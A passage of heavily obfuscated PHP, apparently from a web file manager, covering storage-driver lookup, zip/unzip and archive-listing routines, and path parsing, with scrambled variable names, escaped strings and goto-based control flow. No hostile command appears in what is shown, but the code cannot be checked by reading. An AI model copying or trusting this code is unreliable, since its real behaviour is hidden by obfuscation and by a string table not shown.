$a¿è¿·İè¯->getPath($E²Ö¡Ÿİğ); if (isset($BÓÊœ ç©õ[$fÌ¨ä®¼„ˆ[991]])) { $E²Ö¡Ÿİğ = $BÓÊœ ç©õ[$fÌ¨ä®¼„ˆ[991]]; } goto d‹ñ©¡á‡; bôª’ë÷²Ü: $fÌ¨ä®¼„ˆ =& $_SERVER[Ö]; $cÂèÀè±ÔÖ = $BÓÊœ ç©õ[$fÌ¨ä®¼„ˆ[1005]]; $FÃĞ„›êòÍ = $BÓÊœ ç©õ[$fÌ¨ä®¼„ˆ[363]]; goto E˜Œ´İíÕÉ; aŸ³é›­„Ã: $a¿è¿·İè¯ = self::$driverCache[$AÕøôàÊÇ]; $a¿è¿·İè¯->pathDriver = $cÂèÀè±ÔÖ; $a¿è¿·İè¯->pathBase = $fÌ¨ä®¼„ˆ[33]; goto aà·ª¿øÆ„; E˜Œ´İíÕÉ: switch ($BÓÊœ ç©õ[$fÌ¨ä®¼„ˆ[29]]) { case KodIO::KOD_IO: $A—ËŒÉîêò = self::$driverListSystem[$FÃĞ„›êòÍ]; break; case KodIO::KOD_SOURCE: $E²Ö¡Ÿİğ = $FÃĞ„›êòÍ . $E²Ö¡Ÿİğ; $A—ËŒÉîêò = array($fÌ¨ä®¼„ˆ[1006] => $fÌ¨ä®¼„ˆ[1007], $fÌ¨ä®¼„ˆ[6] => $BÓÊœ ç©õ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $dÒå§†¡è = $GLOBALS[$fÌ¨ä®¼„ˆ[1008]]; self::$driverListUser = array_to_keyvalue($dÒå§†¡è, $fÌ¨ä®¼„ˆ[363]); } $A—ËŒÉîêò = self::$driverListUser[$FÃĞ„›êòÍ]; break; case KodIO::KOD_SHARE_LINK: $A—ËŒÉîêò = array($fÌ¨ä®¼„ˆ[1006] => $fÌ¨ä®¼„ˆ[1009], $fÌ¨ä®¼„ˆ[6] => $BÓÊœ ç©õ); $FâÛ±‘² = Action($fÌ¨ä®¼„ˆ[1010])->sharePathInfo($BÓÊœ ç©õ[$fÌ¨ä®¼„ˆ[75]]); $E²Ö¡Ÿİğ = $FâÛ±‘²[$fÌ¨ä®¼„ˆ[365]]; if (!$FâÛ±‘²[$fÌ¨ä®¼„ˆ[365]]) { $B…¸—ïàƒŒ = Model($fÌ¨ä®¼„ˆ[532])->getInfo($FâÛ±‘²[$fÌ¨ä®¼„ˆ[437]]); $E²Ö¡Ÿİğ = KodIO::clear($B…¸—ïàƒŒ[$fÌ¨ä®¼„ˆ[1011]] . $BÓÊœ ç©õ[$fÌ¨ä®¼„ˆ[1004]]); $BÓÊœ ç©õ[$fÌ¨ä®¼„ˆ[435]] = $B…¸—ïàƒŒ; $BÓÊœ ç©õ[$fÌ¨ä®¼„ˆ[991]] = $E²Ö¡Ÿİğ; $A—ËŒÉîêò = array($fÌ¨ä®¼„ˆ[1006] => $fÌ¨ä®¼„ˆ[1012], $fÌ¨ä®¼„ˆ[6] => $BÓÊœ ç©õ); } break; case KodIO::KOD_SHARE_ITEM: $A—ËŒÉîêò = array($fÌ¨ä®¼„ˆ[1006] => $fÌ¨ä®¼„ˆ[1013], $fÌ¨ä®¼„ˆ[6] => $BÓÊœ ç©õ); $B…¸—ïàƒŒ = Model($fÌ¨ä®¼„ˆ[532])->getInfo($BÓÊœ ç©õ[$fÌ¨ä®¼„ˆ[363]]); if ($B…¸—ïàƒŒ[$fÌ¨ä®¼„ˆ[365]] == $fÌ¨ä®¼„ˆ[464]) { $E²Ö¡Ÿİğ = KodIO::clear($B…¸—ïàƒŒ[$fÌ¨ä®¼„ˆ[1011]] . $BÓÊœ ç©õ[$fÌ¨ä®¼„ˆ[1004]]); $BÓÊœ ç©õ[$fÌ¨ä®¼„ˆ[435]] = $B…¸—ïàƒŒ; $BÓÊœ ç©õ[$fÌ¨ä®¼„ˆ[991]] = $E²Ö¡Ÿİğ; $A—ËŒÉîêò = array($fÌ¨ä®¼„ˆ[1006] => $fÌ¨ä®¼„ˆ[1014], $fÌ¨ä®¼„ˆ[6] => $BÓÊœ ç©õ); } break; default: $E²Ö¡Ÿİğ = $BÓÊœ ç©õ[$fÌ¨ä®¼„ˆ[75]]; $A—ËŒÉîêò = array($fÌ¨ä®¼„ˆ[1006] => $fÌ¨ä®¼„ˆ[1015]); break; } $AÕøôàÊÇ = $BÓÊœ ç©õ[$fÌ¨ä®¼„ˆ[75]]; if (!isset(self::$driverCache[$AÕøôàÊÇ])) { $có‚‹õ”Ó÷ = strtolower($A—ËŒÉîêò[$fÌ¨ä®¼„ˆ[90]]); $a ØƒØ«•Æ = $GLOBALS[$fÌ¨ä®¼„ˆ[6]][$fÌ¨ä®¼„ˆ[84]][$fÌ¨ä®¼„ˆ[1016]]; $Eï±™ÓÒë = $fÌ¨ä®¼„ˆ[71] . (isset($a ØƒØ«•Æ[$có‚‹õ”Ó÷]) ? $a ØƒØ«•Æ[$có‚‹õ”Ó÷] : ucfirst($có‚‹õ”Ó÷)); if (!class_exists($Eï±™ÓÒë)) { show_json("{$Eï±™ÓÒë}\40\156\157\x74\40\145\x78\x69\x73\164\163\41", !1); } $f·Ñåºô¦¦ = isset($A—ËŒÉîêò[$fÌ¨ä®¼„ˆ[6]]) ? $A—ËŒÉîêò[$fÌ¨ä®¼„ˆ[6]] : !1; self::$driverCache[$AÕøôàÊÇ] = new $Eï±™ÓÒë($f·Ñåºô¦¦); } goto aŸ³é›­„Ã; d‹ñ©¡á‡: $a¿è¿·İè¯->path = $E²Ö¡Ÿİğ; return $a¿è¿·İè¯; goto Dç ùò§Õ; Dç ùò§Õ: } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $bÊéí¢ÆŒÕ; if (!$bÊéí¢ÆŒÕ) { $aËŞßœÏ‡Î = IO::init($_SERVER[Ö][8]); } return $aËŞßœÏ‡Î; } private static function iconvSystem($A‰Ú‡¼Ö‡ø) { return self::local()->iconvSystem($A‰Ú‡¼Ö‡ø); } private static function iconvApp($b¹ØË·›ä) { return self::local()->iconvApp($b¹ØË·›ä); } public static function zip($cµİ¨õš‰, $B˜›Ï´Í©† = "\172\151\x70", $E¢—¸÷™ø­ = '', $A¬ˆÊ´ä‚Ñ = REPEAT_RENAME) { goto dÆ²“±ä; F…ÒèÎƒå: if (count($D—Ô¬™‰˜Ÿ) > 1) { $c‰ñŞá¦„’ = IO::info(IO::pathFather($AÈ‘›Ó³[$E«Ö¯áš°‹[75]])); $fÊ¿„³…”× = $c‰ñŞá¦„’[$E«Ö¯áš°‹[28]]; } $A‹ŞØÍ¸é¯ = $dÕ“ªĞ»²; if (!$A‹ŞØÍ¸é¯) { $A‹ŞØÍ¸é¯ = get_path_father($AÈ‘›Ó³[$E«Ö¯áš°‹[75]]); $Bï¬–Ô¤ƒ¢ = IO::info($A‹ŞØÍ¸é¯); if (!$Bï¬–Ô¤ƒ¢[$E«Ö¯áš°‹[185]]) { show_json(LNG($E«Ö¯áš°‹[1019]), !1); } } goto eÆÓè ÁÑ; f¥¹Û§ÎÁœ: foreach ($D—Ô¬™‰˜Ÿ as $dëËÙáÛ è => $döÅêªˆà¯) { $D—Ô¬™‰˜Ÿ[$dëËÙáÛ è] = self::iconvSystem($döÅêªˆà¯); } KodArchive::create($DÕğ™³±©, $D—Ô¬™‰˜Ÿ); if (!IO::exist($Bá±Å…îØß)) { if ($dÕ“ªĞ»²) { del_dir($dÕ“ªĞ»²); } show_json(LNG($E«Ö¯áš°‹[1020]), !1); } goto aÄé¾Ì‹ÄÈ; aÄé¾Ì‹ÄÈ: if ($E¢—¸÷™ø­ || !$dÕ“ªĞ»²) { if ($dÕ“ªĞ»² && strstr($dÕ“ªĞ»², TEMP_FILES)) { $Cµ‘“Ö‹Õã = $D—Ô¬™‰˜Ÿ = array(); recursion_dir($A‹ŞØÍ¸é¯, $Cµ‘“Ö‹Õã, $D—Ô¬™‰˜Ÿ, 0); foreach ($Cµ‘“Ö‹Õã as $bÔ«¦„Ó±) { del_dir($bÔ«¦„Ó±); } foreach ($D—Ô¬™‰˜Ÿ as $Eø¡ÎÏäËÍ) { if ($Eø¡ÎÏäËÍ == $DÕğ™³±©) { continue; } del_file($Eø¡ÎÏäËÍ); } } return $Bá±Å…îØß; } $F‘‹¡¹×ì = self::pathFather($AÈ‘›Ó³[$E«Ö¯áš°‹[75]]); $E£¬²­É¾¼ = self::move($Bá±Å…îØß, $F‘‹¡¹×ì, $A¬ˆÊ´ä‚Ñ); goto c¤°½ŒÄ˜ã; eÆÓè ÁÑ: $Bá±Å…îØß = $A‹ŞØÍ¸é¯ . $fÊ¿„³…”× . $E«Ö¯áš°‹[91] . $B˜›Ï´Í©†; $Bá±Å…îØß = get_filename_auto($Bá±Å…îØß, $E«Ö¯áš°‹[33], $A¬ˆÊ´ä‚Ñ); $DÕğ™³±© = self::iconvSystem($Bá±Å…îØß); goto f¥¹Û§ÎÁœ; c¤°½ŒÄ˜ã: if (!$E£¬²­É¾¼) { del_dir($dÕ“ªĞ»²); show_json(LNG($E«Ö¯áš°‹[1020]), !1); } del_dir($dÕ“ªĞ»²); return $E£¬²­É¾¼; goto F›¶Ï·É™; dÆ²“±ä: $E«Ö¯áš°‹ =& $_SERVER[Ö]; $b–†¾Ãˆ¶ = self::init($cµİ¨õš‰[0][$E«Ö¯áš°‹[75]]); $AÈ‘›Ó³ = self::info($cµİ¨õš‰[0][$E«Ö¯áš°‹[75]]); goto fò÷Õ°±; fò÷Õ°±: $dÕ“ªĞ»² = !1; if (!$E¢—¸÷™ø­ && $b–†¾Ãˆ¶->getType() == $E«Ö¯áš°‹[101]) { $D—Ô¬™‰˜Ÿ = self::zipFileList($cµİ¨õš‰); } else { $dÕ“ªĞ»² = $E¢—¸÷™ø­ ? $E¢—¸÷™ø­ : TEMP_FILES . $E«Ö¯áš°‹[1018] . time() . rand_string(8) . $E«Ö¯áš°‹[8]; mk_dir($dÕ“ªĞ»²); $D—Ô¬™‰˜Ÿ = self::zipFileList($cµİ¨õš‰, $dÕ“ªĞ»²); } $fÊ¿„³…”× = $AÈ‘›Ó³[$E«Ö¯áš°‹[28]]; goto F…ÒèÎƒå; F›¶Ï·É™: } public static function unzip($EÖë½£ƒö, $bºêòÊ‰Êò = "\162\145\x70\154\x61\143\145") { goto e¤—‡Â½ÇÛ; däêÎÛ‹Š›: mk_dir($eÑ˜àÌ£ƒß); $eùÆÈ‰ßŸÒ = self::fileExt($C¹ê¥çŠ¤Ç); $AÚŠŸöÜš = $eÑ˜àÌ£ƒß . $eÜ¼Æ²[91] . $eùÆÈ‰ßŸÒ; goto dç¾Öïôì§; BêÅ”ùø§: if (!($C¹ê¥çŠ¤Ç = parent::info($eÈö‘‡ï¼Ş))) { show_json(LNG($eÜ¼Æ²[1022]), !1); } if (!($c£´•ˆŠØ® = parent::infoFull($bÀ¥À›¤¡é))) { $bÀ¥À›¤¡é = parent::mkdir($bÀ¥À›¤¡é); $c£´•ˆŠØ® = array($eÜ¼Æ²[75] => $bÀ¥À›¤¡é); } else { if (isset($c£´•ˆŠØ®[$eÜ¼Æ²[365]]) && trim($c£´•ˆŠØ®[$eÜ¼Æ²[75]], $eÜ¼Æ²[8]) != trim($bÀ¥À›¤¡é, $eÜ¼Æ²[8])) { $EÂÍ²À¢‚È = KodIO::make($c£´•ˆŠØ®[$eÜ¼Æ²[457]]); $aÂÕ¢¥Ã = parent::fileNameAuto($EÂÍ²À¢‚È, $c£´•ˆŠØ®[$eÜ¼Æ²[28]], REPEAT_RENAME_FOLDER, !0); $bÀ¥À›¤¡é = parent::mkdir($EÂÍ²À¢‚È . $aÂÕ¢¥Ã); $c£´•ˆŠØ® = array($eÜ¼Æ²[75] => $bÀ¥À›¤¡é); } } $bÀ¥À›¤¡é = $c£´•ˆŠØ®[$eÜ¼Æ²[75]]; goto fÓìøŒÎßÑ; cÄ…šàà‰Ñ: foreach ($dğ¤Ôšò as $D’ƒ©¡š’‰) { $D’ƒ©¡š’‰ = self::iconvApp($D’ƒ©¡š’‰); self::move($D’ƒ©¡š’‰, $bÀ¥À›¤¡é, $bºêòÊ‰Êò); } del_dir($eÑ˜àÌ£ƒß); if (!$dÚĞ¯†ÒÈ–) { del_file($AÚŠŸöÜš); } goto D¨ŒæË®§; fÓìøŒÎßÑ: $e·§ œŠ¯‘ = self::tmpFileName($C¹ê¥çŠ¤Ç); $eÑ˜àÌ£ƒß = TEMP_FILES . $e·§ œŠ¯‘; del_dir($eÑ˜àÌ£ƒß); goto däêÎÛ‹Š›; D¨ŒæË®§: return !0; goto DÖÇ™İÃÂø; e•é„¸Ûù: Hook::trigger($eÜ¼Æ²[1028], $eÑ˜àÌ£ƒß); recursion_dir($eÑ˜àÌ£ƒß, $b†‘óè‹Ç˜, $c”²ë¾ÏÊ÷, 0); $dğ¤Ôšò = array_merge($b†‘óè‹Ç˜, $c”²ë¾ÏÊ÷); goto cÄ…šàà‰Ñ; e¤—‡Â½ÇÛ: $eÜ¼Æ² =& $_SERVER[Ö]; $eÈö‘‡ï¼Ş = $EÖë½£ƒö[$eÜ¼Æ²[75]]; $bÀ¥À›¤¡é = $EÖë½£ƒö[$eÜ¼Æ²[1021]]; goto BêÅ”ùø§; Fê¼¼”ÄÅ«: $f¸ÚÇÄ¿òÁ = KodArchive::extract($AÚŠŸöÜš, $eÑ˜àÌ£ƒß . $eÜ¼Æ²[8], $D¶Ö·®÷ê¢); self::archiveExt(); if (!$f¸ÚÇÄ¿òÁ[$eÜ¼Æ²[1025]]) { show_json($eÜ¼Æ²[1026] . $f¸ÚÇÄ¿òÁ[$eÜ¼Æ²[1027]], !1); } goto e•é„¸Ûù; dç¾Öïôì§: if (!@file_exists(self::iconvSystem($AÚŠŸöÜš))) { $dÚĞ¯†ÒÈ– = self::localFilePath($eÈö‘‡ï¼Ş, $eùÆÈ‰ßŸÒ); $AÚŠŸöÜš = $dÚĞ¯†ÒÈ– ? $dÚĞ¯†ÒÈ– : parent::download($eÈö‘‡ï¼Ş, $AÚŠŸöÜš); } $AÚŠŸöÜš = self::iconvSystem($AÚŠŸöÜš); $D¶Ö·®÷ê¢ = isset($EÖë½£ƒö[$eÜ¼Æ²[1023]]) ? $EÖë½£ƒö[$eÜ¼Æ²[1023]] : $eÜ¼Æ²[1024]; goto Fê¼¼”ÄÅ«; DÖÇ™İÃÂø: } public static function unzipList($A×³±¢Õ•“) { goto f‰Ì¤‹†˜; aÈôçï¸£™: return $bµ¥Æ„ìŸ[$f‰éÖšƒÙ¢[1027]]; goto Eï…¹ô…°õ; E…á–İ†é: $AºÓ´ù›ÒŒ = self::iconvSystem($AºÓ´ù›ÒŒ); if ($c‰¿óÑåöö >= 0) { $A·¥‡óÌ”š = isset($A×³±¢Õ•“[$f‰éÖšƒÙ¢[1033]]) ? $A×³±¢Õ•“[$f‰éÖšƒÙ¢[1033]] : !1; $cÔÕÔ…Ìöİ = isset($A×³±¢Õ•“[$f‰éÖšƒÙ¢[28]]) ? $A×³±¢Õ•“[$f‰éÖšƒÙ¢[28]] : $f‰éÖšƒÙ¢[33]; KodArchive::filePreview($AºÓ´ù›ÒŒ, $c‰¿óÑåöö, $A·¥‡óÌ”š, $cÔÕÔ…Ìöİ); self::archiveExt(); die; } $bµ¥Æ„ìŸ = KodArchive::listContent($AºÓ´ù›ÒŒ); goto Bæ¤—Èù¸À; f‰Ì¤‹†˜: $f‰éÖšƒÙ¢ =& $_SERVER[Ö]; $B¯—ù¿æÀß = $A×³±¢Õ•“[$f‰éÖšƒÙ¢[75]]; $c‰¿óÑåöö = isset($A×³±¢Õ•“[$f‰éÖšƒÙ¢[1029]]) ? $A×³±¢Õ•“[$f‰éÖšƒÙ¢[1029]] : -1; goto eÆíŸ¼¾ø; eÆíŸ¼¾ø: $eÓÁéËá = 50000; if (request_url_safe($B¯—ù¿æÀß)) { $c•Å†îÂ­Ø = parse_url_query($B¯—ù¿æÀß); if (!isset($c•Å†îÂ­Ø[$f‰éÖšƒÙ¢[75]])) { show_json($f‰éÖšƒÙ¢[1030], !1); } } $Dã‰¥Ëé­  = isset($c•Å†îÂ­Ø) ? $c•Å†îÂ­Ø[$f‰éÖšƒÙ¢[75]] : $B¯—ù¿æÀß; goto a¨›Ğè‡Òº; D¬‹õ‚¤Œ: if (!is_dir($F£ö¹„ÛÇ‰)) { mk_dir($F£ö¹„ÛÇ‰); } $AºÓ´ù›ÒŒ = $F£ö¹„ÛÇ‰ . $f‰éÖšƒÙ¢[8] . $Bªö‚ïóÂ; if (!@file_exists(self::iconvSystem($AºÓ´ù›ÒŒ))) { if (isset($c•Å†îÂ­Ø)) { url_request($B¯—ù¿æÀß, $f‰éÖšƒÙ¢[1032], $AºÓ´ù›ÒŒ); } else { $aÙ½–¢ˆ‡œ = self::localFilePath($B¯—ù¿æÀß, $EçÚ£Ôß¡µ); $AºÓ´ù›ÒŒ = $aÙ½–¢ˆ‡œ ? $aÙ½–¢ˆ‡œ : self::download($B¯—ù¿æÀß, $AºÓ´ù›ÒŒ); } } goto E…á–İ†é; Bæ¤—Èù¸À: self::archiveExt(); del_dir($F£ö¹„ÛÇ‰); if (!$bµ¥Æ„ìŸ[$f‰éÖšƒÙ¢[1025]]) { show_json($bµ¥Æ„ìŸ[$f‰éÖšƒÙ¢[1027]], !1); } goto dˆÙäñã‡å; dˆÙäñã‡å: $a»©ª˜è¾Ò = json_encode($bµ¥Æ„ìŸ[$f‰éÖšƒÙ¢[1027]]); self::setContent($D•Ø‰âÓ ®, $a»©ª˜è¾Ò); if (count($bµ¥Æ„ìŸ[$f‰éÖšƒÙ¢[1027]]) >= $eÓÁéËá) { show_json(sprintf(LNG($f‰éÖšƒÙ¢[1031]), count($bµ¥Æ„ìŸ[$f‰éÖšƒÙ¢[1027]])), !1); } goto aÈôçï¸£™; F¢ÁÌ·¹ĞŸ: if (isset($c•Å†îÂ­Ø)) { $A­İáÏÉ = array($c•Å†îÂ­Ø[$f‰éÖšƒÙ¢[75]], $c•Å†îÂ­Ø[$f‰éÖšƒÙ¢[1029]], $c•Å†îÂ­Ø[$f‰éÖšƒÙ¢[28]]); $Bªö‚ïóÂ = md5(implode($f‰éÖšƒÙ¢[70], $A­İáÏÉ)) . $f‰éÖšƒÙ¢[91] . get_path_ext($c•Å†îÂ­Ø[$f‰éÖšƒÙ¢[28]]); } else { $A­İáÏÉ = array($eã‚í¯ˆ[$f‰éÖšƒÙ¢[28]], $eã‚í¯ˆ[$f‰éÖšƒÙ¢[75]], $eã‚í¯ˆ[$f‰éÖšƒÙ¢[77]]); $Bªö‚ïóÂ = md5(implode($f‰éÖšƒÙ¢[70], $A­İáÏÉ)) . $f‰éÖšƒÙ¢[91] . $EçÚ£Ôß¡µ; } if ($c‰¿óÑåöö == -1) { $D•Ø‰âÓ ® = IO_PATH_SYSTEM_TEMP . "\172\x69\x70\126\x69\x65\x77\57{$bïÂ«ÄË«}\57{$Bªö‚ïóÂ}\x2e\154\157\147"; $f²×ÙÜœŠŒ = self::infoFull($D•Ø‰âÓ ®); if ($f²×ÙÜœŠŒ) { $D•Ø‰âÓ ® = $f²×ÙÜœŠŒ[$f‰éÖšƒÙ¢[75]]; $b—„‘…Áš¡ = self::getContent($D•Ø‰âÓ ®); if ($b—„‘…Áš¡) { $a»©ª˜è¾Ò = json_decode($b—„‘…Áš¡, !0); if (count($a»©ª˜è¾Ò) >= $eÓÁéËá) { show_json(sprintf(LNG($f‰éÖšƒÙ¢[1031]), count($a»©ª˜è¾Ò)), !1); } return $a»©ª˜è¾Ò; } } else { $D•Ø‰âÓ ® = self::mkfile($D•Ø‰âÓ ®); } } $F£ö¹„ÛÇ‰ = TEMP_FILES . $bïÂ«ÄË«; goto D¬‹õ‚¤Œ; a¨›Ğè‡Òº: $eã‚í¯ˆ = self::info($Dã‰¥Ëé­ ); $EçÚ£Ôß¡µ = self::fileExt($eã‚í¯ˆ); $bïÂ«ÄË« = self::tmpFileName($eã‚í¯ˆ); goto F¢ÁÌ·¹ĞŸ; Eï…¹ô…°õ: } private static function fileExt($FÌ—‰ßê¯) { $F£§Äİ¶«Ô =& $_SERVER[Ö]; $E¥ïëâÅô = $FÌ—‰ßê¯[$F£§Äİ¶«Ô[156]]; if ($E¥ïëâÅô == $F£§Äİ¶«Ô[1034]) { $A¢Éøˆ…À = $F£§Äİ¶«Ô[1035]; if (substr($FÌ—‰ßê¯[$F£§Äİ¶«Ô[28]], -strlen($A¢Éøˆ…À)) == $A¢Éøˆ…À) { $E¥ïëâÅô = $F£§Äİ¶«Ô[1036]; } } self::archiveExt($E¥ïëâÅô); return $E¥ïëâÅô; } private static function zipFileList($aÌìäÜƒÃ±, $bŠ¼¼¿‘Ä­ = false) { $B¨ğƒœ’í¼ =& $_SERVER[Ö]; $aŠÇ–Õ¸ì = array(); foreach ($aÌìäÜƒÃ± as $cÅÒá›Œ¯²) { $Eò¦’ÚÜç = $cÅÒá›Œ¯²[$B¨ğƒœ’í¼[75]]; if ($bŠ¼¼¿‘Ä­) { $Eò¦’ÚÜç = self::copy($cÅÒá›Œ¯²[$B¨ğƒœ’í¼[75]], $bŠ¼¼¿‘Ä­, $B¨ğƒœ’í¼[737]); } if ($Eò¦’ÚÜç && self::local()->exist($Eò¦’ÚÜç)) { $aŠÇ–Õ¸ì[$cÅÒá›Œ¯²[$B¨ğƒœ’í¼[75]]] = $Eò¦’ÚÜç; } } if (!empty($aŠÇ–Õ¸ì)) { return array_values($aŠÇ–Õ¸ì); } show_json(LNG($B¨ğƒœ’í¼[1037]), !1); } public static function tmpFileName($Eª¢ö×ÇšŒ) { $cÅµÜƒ¹É =& $_SERVER[Ö]; $dİÒçøæÁî = array($Eª¢ö×ÇšŒ[$cÅµÜƒ¹É[28]], $Eª¢ö×ÇšŒ[$cÅµÜƒ¹É[75]], $Eª¢ö×ÇšŒ[$cÅµÜƒ¹É[77]], $Eª¢ö×ÇšŒ[$cÅµÜƒ¹É[455]]); return md5(implode($cÅµÜƒ¹É[70], $dİÒçøæÁî)); } private static function localFilePath($aùŸƒÌğÒ, $fİË³›Õ¶) { goto d‚°àá®¯¹; FÂ”òªÎÂ: if ($D•Àµñö„ == $Fåµ´¸Îå[101] || $D•Àµñö„ == $Fåµ´¸Îå[1041]) { if (!$AÂ«©£ãø->exist($AÂ«©£ãø->path)) { show_json(LNG($Fåµ´¸Îå[100]), !1); } return $AÂ«©£ãø->path; } return !1; goto c¦ó³‹æ‰; d‚°àá®¯¹: $Fåµ´¸Îå =& $_SERVER[Ö]; if ($fİË³›Õ¶ == $Fåµ´¸Îå[1038] && strtoupper(substr(PHP_OS, 0, 3)) == $Fåµ´¸Îå[1039]) { return !1; } $BÅ±¥é‘·ç = KodIO::parse($aùŸƒÌğÒ); goto báÑÏ©ßÜ…; báÑÏ©ßÜ…: if ($BÅ±¥é‘·ç[$Fåµ´¸Îå[29]] == KodIO::KOD_SOURCE) { $Dºï»È÷¯¹ = Model($Fåµ´¸Îå[745])->fileInfoGet(KodIO::sourceID($aùŸƒÌğÒ)); if (!$Dºï»È÷¯¹[$Fåµ´¸Îå[75]]) { show_json($Fåµ´¸Îå[1040], !1); } $aùŸƒÌğÒ = $Dºï»È÷¯¹[$Fåµ´¸Îå[75]]; } $AÂ«©£ãø = self::init($aùŸƒÌğÒ); $D•Àµñö„ = $AÂ«©£ãø->getType(); goto FÂ”òªÎÂ; c¦ó³‹æ‰: } private static function archiveExt($eÄ¡˜¿òÆ = '') { $GLOBALS[$_SERVER[Ö][1042]] = $eÄ¡˜¿òÆ; } } class KodIO { const KOD_SOURCE = "\x7b\x73\157\165\162\x63\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\165\x73\145\162\x52\145\143\171\x63\154\x65\x7d"; const KOD_USER_FAV = "\173\165\x73\145\x72\x46\x61\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\x75\163\x65\162\106\x69\x6c\145\124\x61\147\175"; const KOD_USER_FILE_TYPE = "\173\x75\x73\145\x72\x46\x69\x6c\145\x54\171\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\x6f\x75\160\122\157\x6f\164\123\x65\154\146\175"; const KOD_USER_SHARE = "\x7b\x75\163\x65\162\x53\x68\141\x72\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\145\162\123\x68\x61\x72\145\114\x69\156\x6b\175"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\141\x72\145\124\157\x4d\145\175"; const KOD_SHARE_ITEM = "\x7b\x73\x68\141\162\x65\x49\x74\x65\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\163\x68\x61\162\x65\x49\x74\145\155\114\151\x6e\153\x7d"; const KOD_SEARCH = "\173\163\x65\141\x72\x63\150\175"; const KOD_BLOCK = "\x7b\x62\x6c\157\x63\153\175"; const KOD_IO = "\173\x69\x6f\175"; const KOD_USER_RECENT = "\173\165\163\x65\x72\x52\145\156\143\x65\x6e\x74\x7d"; const KOD_USER_DRIVER = "\173\144\162\x69\166\x65\x72\175"; public static function typeList() { $DŞØÇŒ¨¹ =& $_SERVER[Ö]; return array($DŞØÇŒ¨¹[1043] => self::KOD_SOURCE, $DŞØÇŒ¨¹[1044] => self::KOD_USER_RECYCLE, $DŞØÇŒ¨¹[1045] => self::KOD_USER_FAV, $DŞØÇŒ¨¹[1046] => self::KOD_USER_FILE_TAG, $DŞØÇŒ¨¹[1047] => self::KOD_USER_FILE_TYPE, $DŞØÇŒ¨¹[1048] => self::KOD_GROUP_ROOT_SELF, $DŞØÇŒ¨¹[1049] => self::KOD_USER_SHARE, $DŞØÇŒ¨¹[1050] => self::KOD_USER_SHARE_LINK, $DŞØÇŒ¨¹[1051] => self::KOD_USER_SHARE_TO_ME, $DŞØÇŒ¨¹[1052] => self::KOD_SHARE_ITEM, $DŞØÇŒ¨¹[1053] => self::KOD_SHARE_LINK, $DŞØÇŒ¨¹[1054] => self::KOD_SEARCH, $DŞØÇŒ¨¹[1055] => self::KOD_BLOCK, $DŞØÇŒ¨¹[1056] => self::KOD_IO, $DŞØÇŒ¨¹[1057] => self::KOD_USER_RECENT, $DŞØÇŒ¨¹[1058] => self::KOD_USER_DRIVER); } public static function parse($FŞˆÌ¯‰¾æ) { goto CÀî‡ó¬š; cÖÙ÷ì™Ç«: $AÇ·¡’Òåˆ = array($dÕ½ãŠ”[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $f¨Œ¥×÷©[$dÕ½ãŠ”[1063]] = in_array($f¨Œ¥×÷©[$dÕ½ãŠ”[29]], $AÇ·¡’Òåˆ); return $f¨Œ¥×÷©; goto bÙóó„‹»; Báô½Š¬í±: preg_match($dÕ½ãŠ”[1059], $FŞˆÌ¯‰¾æ, $BâéÃàÕ²¾); $f¨Œ¥×÷© = array($dÕ½ãŠ”[384] => !1, $dÕ½ãŠ”[1060] => !1, $dÕ½ãŠ”[381] => !1, $dÕ½ãŠ”[75] => $FŞˆÌ¯‰¾æ, $dÕ½ãŠ”[1005] => !1, $dÕ½ãŠ”[1004] => $dÕ½ãŠ”[33]); if (is_array($BâéÃàÕ²¾) && count($BâéÃàÕ²¾) == 5) { $dÅŞØƒ¢ = $dÕ½ãŠ”[1061] . $BâéÃàÕ²¾[2] . $dÕ½ãŠ”[311]; if (in_array($dÅŞØƒ¢, $aŒÒêÚ‚´İ)) { $f¨Œ¥×÷©[$dÕ½ãŠ”[1005]] = $BâéÃàÕ²¾[1]; $f¨Œ¥×÷©[$dÕ½ãŠ”[29]] = $dÅŞØƒ¢; $f¨Œ¥×÷©[$dÕ½ãŠ”[1062]] = substr($dÅŞØƒ¢, 1, -1); $f¨Œ¥×÷©[$dÕ½ãŠ”[363]] = $BâéÃàÕ²¾[3]; } $f¨Œ¥×÷©[$dÕ½ãŠ”[1004]] = $BâéÃàÕ²¾[4]; } goto cÖÙ÷ì™Ç«; CÀî‡ó¬š: $dÕ½ãŠ” =& $_SERVER[Ö]; $FŞˆÌ¯‰¾æ = self::clear($FŞˆÌ¯‰¾æ); $aŒÒêÚ‚´İ = array_values(self::typeList()); goto Báô½Š¬í±; bÙóó„‹»: } public static function clear($BĞæ‰¤¬Ğ¼) { goto cáëì”‚¢; e™Ûù©ÄéÂ: if ($BĞæ‰¤¬Ğ¼ == $eŒöŞËîğ¾[8]) { return $eŒöŞËîğ¾[8]; } $BĞæ‰¤¬Ğ¼ = rtrim($BĞæ‰¤¬Ğ¼, $eŒöŞËîğ¾[8]); return $BĞæ‰¤¬Ğ¼; goto bæš¯ëëÔô; FŒ­‘†ô¢ã: if (substr($BĞæ‰¤¬Ğ¼, 0, 3) == $eŒöŞËîğ¾[1065]) { $BĞæ‰¤¬Ğ¼ = substr($BĞæ‰¤¬Ğ¼, 3); } while (strstr($BĞæ‰¤¬Ğ¼, $AÚ åÈ÷Ğ)) { $BĞæ‰¤¬Ğ¼ = str_replace($AÚ åÈ÷Ğ, $eŒöŞËîğ¾[8], $BĞæ‰¤¬Ğ¼); } $BĞæ‰¤¬Ğ¼ = preg_replace($eŒöŞËîğ¾[1066], $eŒöŞËîğ¾[8], $BĞæ‰¤¬Ğ¼); goto e™Ûù©ÄéÂ; cáëì”‚¢: $eŒöŞËîğ¾ =& $_SERVER[Ö]; $BĞæ‰¤¬Ğ¼ = str_replace($eŒöŞËîğ¾[93], $eŒöŞËîğ¾[8], $BĞæ‰¤¬Ğ¼); $AÚ åÈ÷Ğ = $eŒöŞËîğ¾[1064]; goto FŒ­‘†ô¢ã; bæš¯ëëÔô: } public static function sourceID($Dİ‹˜‹×’ó) { $cèÖË¡“ƒ„ =& $_SERVER[Ö]; $dÏ‡¿«°… = 